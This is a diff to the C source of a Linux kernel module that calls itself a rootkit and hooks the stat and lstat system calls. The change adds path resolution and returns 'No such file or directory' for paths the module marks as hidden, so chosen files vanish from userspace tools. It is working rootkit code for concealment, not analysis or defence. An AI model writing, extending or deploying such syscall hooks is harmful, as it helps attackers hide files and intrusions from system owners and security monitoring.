@@ -5,19 +5,20 @@
 #include <linux/err.h>
 #include <linux/fdtable.h>
 #include <linux/limits.h>
+#include <linux/namei.h>
 #include <linux/printk.h>
 #include <linux/stat.h>
 #include <linux/string.h>
 #include <linux/types.h>
 
-static long do_stat(const sysfun_t orig_func, struct pt_regs *const p_regs,
-                    const char *const s_filename, struct __old_kernel_stat *const statbuf)
+static long do_statx(const sysfun_t orig_func, struct pt_regs *const p_regs, const int i32_dfd,
+                     const char __user *const s_filename, const int i32_flags)
 {
     long l_ret               = 0;    // Return value of the real syscall
+    int i_err                = 0;    // Return value for user_path_at
     const char *s_filename_k = NULL; // Name of the file
-
-    l_ret = orig_func(p_regs);
-    pr_cont(" = %ld\n", l_ret);
+    const char *s_pathname   = NULL; // Pathname of the file
+    path_t path;                     // Path structure for the file
 
     s_filename_k = strndup_user(s_filename, PATH_MAX);
 
@@ -29,6 +30,32 @@ static long do_stat(const sysfun_t orig_func, struct pt_regs *const p_regs,
     pr_info("[ROOTKIT] * File name: %s\n", s_filename_k);
 
     kfree_const(s_filename_k);
+
+    i_err = user_path_at(i32_dfd, s_filename, i32_flags, &path);
+
+    IF_U (i_err != 0) {
+        pr_err("[ROOTKIT]   * Could not get path\n");
+    }
+    else {
+        s_pathname = path_get_pathname(&path);
+        IF_U (IS_ERR_OR_NULL(s_pathname)) {
+            pr_err("[ROOTKIT]   * Could not get pathname\n");
+        }
+        else {
+            pr_info("[ROOTKIT]   * Path: %s\n", s_pathname);
+            kfree_const(s_pathname);
+        }
+
+        IF_U (is_path_hidden(&path)) {
+            pr_info("[ROOTKIT]   * Hiding file\n");
+
+            return -ENOENT; // No such file or directory
+        }
+        path_put(&path);
+    }
+
+    l_ret = orig_func(p_regs);
+    pr_info("[ROOTKIT] * Return value: %ld\n", l_ret);
 
     return l_ret;
 }
@@ -76,18 +103,18 @@ SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, 
 
 // sys_stat syscall hook handler
 SYSCALL_HOOK_HANDLER2(stat, orig_stat, p_regs, const char __user *, s_filename,
-                      struct __old_kernel_stat __user *, p_statbuf)
+                      struct stat __user *, p_statbuf)
 {
-    pr_info("[ROOTKIT] stat(%p, %p)", s_filename, p_statbuf);
+    pr_info("[ROOTKIT] stat(%p, %p)\n", s_filename, p_statbuf);
 
-    return do_stat(orig_stat, p_regs, s_filename, p_statbuf);
+    return do_statx(orig_stat, p_regs, AT_FDCWD, s_filename, 0);
 }
 
 // sys_lstat syscall hook handler
 SYSCALL_HOOK_HANDLER2(lstat, orig_lstat, p_regs, const char __user *, s_filename,
-                      struct __old_kernel_stat __user *, p_statbuf)
+                      struct stat __user *, p_statbuf)
 {
-    pr_info("[ROOTKIT] lstat(%p, %p)", s_filename, p_statbuf);
+    pr_info("[ROOTKIT] lstat(%p, %p)\n", s_filename, p_statbuf);
 
-    return do_stat(orig_lstat, p_regs, s_filename, p_statbuf);
+    return do_statx(orig_lstat, p_regs, AT_FDCWD, s_filename, AT_SYMLINK_NOFOLLOW);
 }
